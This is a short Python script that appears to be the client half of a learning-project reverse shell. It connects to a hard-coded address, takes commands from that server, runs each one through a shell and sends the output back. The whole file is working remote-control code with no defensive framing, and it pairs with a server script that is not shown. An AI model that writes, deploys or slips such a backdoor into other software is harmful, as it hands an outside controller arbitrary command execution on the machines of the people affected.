# try to connect to the server
# wait for instructions
# receive instruction and run them
# take that result and send them back to the server

import socket
import os
import subprocess

s = socket.socket()
host = "192.168.2.13"
port = 8888  # same as the port in server.py

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                               stderr=subprocess.PIPE)

        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        pwd = os.getcwd() + "> "
        s.send(str.encode(output_str + pwd))

        print(output_str)
